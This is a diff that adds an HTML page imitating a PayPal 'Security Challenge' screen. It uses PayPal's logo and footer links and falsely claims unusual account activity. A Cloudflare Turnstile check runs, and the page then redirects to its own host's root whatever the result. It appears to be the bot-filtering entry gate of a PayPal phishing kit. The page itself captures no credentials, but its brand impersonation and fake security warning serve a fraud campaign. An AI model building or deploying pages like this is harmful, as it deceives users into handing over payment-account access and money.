@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Challenge - PayPal</title>
+    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" type="image/png">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: #f5f7fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #2c2e2f;
+        }
+
+        .container {
+            background: white;
+            padding: 48px 32px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 460px;
+            width: 100%;
+        }
+
+        .paypal-logo {
+            width: 100px;
+            margin-bottom: 32px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 300;
+            margin-bottom: 16px;
+            color: #2c2e2f;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #6c7378;
+            margin-bottom: 32px;
+            line-height: 22px;
+        }
+
+        .security-info {
+            background: #f0f8ff;
+            border: 1px solid #0070ba;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 28px;
+            text-align: left;
+        }
+
+        .security-info h2 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #0070ba;
+        }
+
+        .security-info p {
+            font-size: 14px;
+            color: #2c2e2f;
+            line-height: 20px;
+            margin: 0;
+        }
+
+        .loading-container {
+            margin: 32px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .spinner {
+            width: 34px;
+            height: 34px;
+            border: 4px solid #e5e5e5;
+            border-top-color: #0070ba;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #6c7378;
+        }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e5e5;
+            font-size: 12px;
+            color: #6c7378;
+        }
+
+        .footer a {
+            color: #0070ba;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        #cf-turnstile {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 16px;
+                padding: 32px 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+    
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- PayPal Logo -->
+        <svg class="paypal-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 32">
+            <path fill="#003087" d="M 12 4.917 L 4.2 4.917 C 3.7 4.917 3.2 5.317 3.1 5.817 L 0 25.817 c -0.1 0.5 0.3 0.9 0.8 0.9 L 4.5 26.717 c 0.5 0 0.9 -0.4 1 -0.9 L 6.2 20.017 c 0.1 -0.5 0.5 -0.9 1 -0.9 L 10.1 19.117 c 5.1 0 8.1 -2.5 8.8 -7.3 c 0.4 -2.1 0 -3.7 -1 -4.9 C 16.6 5.617 14.6 4.917 12 4.917 Z M 12.9 12.217 c -0.4 2.4 -2.4 2.4 -4.3 2.4 L 7.4 14.617 L 8.3 9.317 c 0.1 -0.3 0.3 -0.5 0.6 -0.5 L 9.2 8.817 c 1.2 0 2.3 0 2.9 0.7 C 12.4 10.017 12.5 10.917 12.9 12.217 Z"></path>
+            <path fill="#003087" d="M 35.2 12.117 L 31.5 12.117 c -0.3 0 -0.6 0.2 -0.6 0.5 L 30.8 13.617 L 30.7 13.417 c -0.5 -0.7 -1.7 -1 -2.8 -1 c -2.7 0 -5 2 -5.4 4.9 c -0.2 1.4 0.1 2.8 0.9 3.7 c 0.7 0.8 1.8 1.2 3.1 1.2 c 2.2 0 3.4 -1.4 3.4 -1.4 L 29.8 22.017 c -0.1 0.5 0.3 0.9 0.8 0.9 L 34 22.917 c 0.5 0 0.9 -0.4 1 -0.9 L 36.1 12.717 C 36.1 12.417 35.6 12.117 35.2 12.117 Z M 30.7 17.317 c -0.2 1.4 -1.2 2.3 -2.7 2.3 c -0.7 0 -1.2 -0.2 -1.6 -0.6 c -0.4 -0.4 -0.5 -1 -0.4 -1.6 c 0.2 -1.3 1.3 -2.3 2.6 -2.3 c 0.7 0 1.2 0.2 1.6 0.6 C 30.6 16.117 30.8 16.717 30.7 17.317 Z"></path>
+            <path fill="#009cde" d="M 55.1 12.117 L 51.4 12.117 c -0.3 0 -0.6 0.2 -0.6 0.5 L 50.7 13.617 L 50.6 13.417 c -0.5 -0.7 -1.7 -1 -2.8 -1 c -2.7 0 -5 2 -5.4 4.9 c -0.2 1.4 0.1 2.8 0.9 3.7 c 0.7 0.8 1.8 1.2 3.1 1.2 c 2.2 0 3.4 -1.4 3.4 -1.4 L 49.7 22.017 c -0.1 0.5 0.3 0.9 0.8 0.9 L 53.9 22.917 c 0.5 0 0.9 -0.4 1 -0.9 L 56 12.717 C 56 12.417 55.6 12.117 55.1 12.117 Z M 50.6 17.317 c -0.2 1.4 -1.2 2.3 -2.7 2.3 c -0.7 0 -1.2 -0.2 -1.6 -0.6 c -0.4 -0.4 -0.5 -1 -0.4 -1.6 c 0.2 -1.3 1.3 -2.3 2.6 -2.3 c 0.7 0 1.2 0.2 1.6 0.6 C 50.5 16.117 50.7 16.717 50.6 17.317 Z"></path>
+            <path fill="#009cde" d="M 66.9 12.217 L 63.2 12.217 c -0.4 0 -0.7 0.2 -0.8 0.5 L 59 19.117 L 57.2 12.917 c -0.2 -0.5 -0.6 -0.7 -1.1 -0.7 L 52.5 12.217 c -0.5 0 -0.8 0.5 -0.6 0.9 L 55.4 25.217 L 52 30.017 c -0.3 0.5 0 1.1 0.5 1.1 L 56.2 31.117 c 0.4 0 0.7 -0.2 0.8 -0.5 L 67.4 13.117 C 67.7 12.617 67.4 12.217 66.9 12.217 Z"></path>
+            <path fill="#003087" d="M 79.3 4.917 L 71.5 4.917 c -0.5 0 -0.9 0.4 -1 0.9 L 67.4 25.817 c -0.1 0.5 0.3 0.9 0.8 0.9 L 71.9 26.717 c 0.3 0 0.6 -0.3 0.7 -0.6 L 73.3 20.017 c 0.1 -0.5 0.5 -0.9 1 -0.9 L 77.2 19.117 c 5.1 0 8.1 -2.5 8.8 -7.3 c 0.4 -2.1 0 -3.7 -1 -4.9 C 83.7 5.617 81.8 4.917 79.3 4.917 Z M 80.1 12.217 c -0.4 2.4 -2.4 2.4 -4.3 2.4 L 74.6 14.617 L 75.5 9.317 c 0.1 -0.3 0.3 -0.5 0.6 -0.5 L 76.4 8.817 c 1.2 0 2.3 0 2.9 0.7 C 79.6 10.017 79.7 10.917 80.1 12.217 Z"></path>
+            <path fill="#009cde" d="M 99.8 12.117 L 96.1 12.117 c -0.3 0 -0.6 0.2 -0.6 0.5 L 95.4 13.617 L 95.3 13.417 c -0.5 -0.7 -1.7 -1 -2.8 -1 c -2.7 0 -5 2 -5.4 4.9 c -0.2 1.4 0.1 2.8 0.9 3.7 c 0.7 0.8 1.8 1.2 3.1 1.2 c 2.2 0 3.4 -1.4 3.4 -1.4 L 94.4 22.017 c -0.1 0.5 0.3 0.9 0.8 0.9 L 98.6 22.917 c 0.5 0 0.9 -0.4 1 -0.9 L 100.7 12.717 C 100.7 12.417 100.2 12.117 99.8 12.117 Z M 95.3 17.317 c -0.2 1.4 -1.2 2.3 -2.7 2.3 c -0.7 0 -1.2 -0.2 -1.6 -0.6 c -0.4 -0.4 -0.5 -1 -0.4 -1.6 c 0.2 -1.3 1.3 -2.3 2.6 -2.3 c 0.7 0 1.2 0.2 1.6 0.6 C 95.2 16.117 95.4 16.717 95.3 17.317 Z"></path>
+            <path fill="#009cde" d="M 40.8 12.217 L 37.1 12.217 c -0.3 0 -0.6 0.2 -0.7 0.4 L 33 19.917 L 31.1 12.817 c -0.1 -0.4 -0.5 -0.6 -0.9 -0.6 L 26.6 12.217 c -0.5 0 -0.8 0.5 -0.7 0.9 L 29.5 25.817 L 26.2 30.617 c -0.3 0.5 0 1.1 0.5 1.1 L 30.4 31.717 c 0.3 0 0.6 -0.2 0.7 -0.4 L 41.3 13.117 C 41.7 12.617 41.3 12.217 40.8 12.217 Z"></path>
+        </svg>
+        
+        <h1>Security Challenge</h1>
+        
+        <div class="subtitle">
+            We need to verify your identity to keep your account safe and secure
+        </div>
+        
+        <div class="security-info">
+            <h2>Protection in Action</h2>
+            <p>We've detected unusual activity or a login from a new device or location. This quick security check helps protect your PayPal account and funds.</p>
+        </div>
+        
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your request...</div>
+        </div>
+        
+        <div id="cf-turnstile"></div>
+        
+        <div class="footer">
+            <a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full" target="_blank">Privacy</a> • 
+            <a href="https://www.paypal.com/us/webapps/mpp/ua/useragreement-full" target="_blank">User Agreement</a> • 
+            <a href="https://www.paypal.com/us/smarthelp/home" target="_blank">Help</a>
+        </div>
+    </div>
+
+    <script>
+        const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ';
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        
+        console.log('PayPal Turnstile Redirector - Redirect URL:', REDIRECT_URL);
+        
+        function performRedirect() {
+            console.log('Performing redirect to:', REDIRECT_URL);
+            window.location.href = REDIRECT_URL;
+        }
+        
+        if (typeof turnstile === 'undefined') {
+            console.error('Turnstile failed to load. Redirecting anyway...');
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                let verificationTimeout;
+                let verificationCompleted = false;
+                
+                verificationTimeout = setTimeout(function() {
+                    if (!verificationCompleted) {
+                        console.warn('Turnstile verification timeout - redirecting anyway');
+                        document.querySelector('.status-text').textContent = 'Completing verification...';
+                        setTimeout(performRedirect, 500);
+                    }
+                }, 5000);
+                
+                try {
+                    turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
+                        },
+                        'error-callback': function(error) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            console.error('Turnstile error:', error);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            setTimeout(performRedirect, 1000);
+                        },
+                        'timeout-callback': function() {
+                            console.warn('Turnstile timeout');
+                            document.querySelector('.status-text').textContent = 'Verification timeout. Redirecting...';
+                            setTimeout(performRedirect, 1000);
+                        }
+                    });
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    console.error('Failed to render Turnstile:', e);
+                    setTimeout(performRedirect, 1500);
+                }
+            });
+        }
+        
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                console.log('3-second fallback redirect triggered');
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                performRedirect();
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
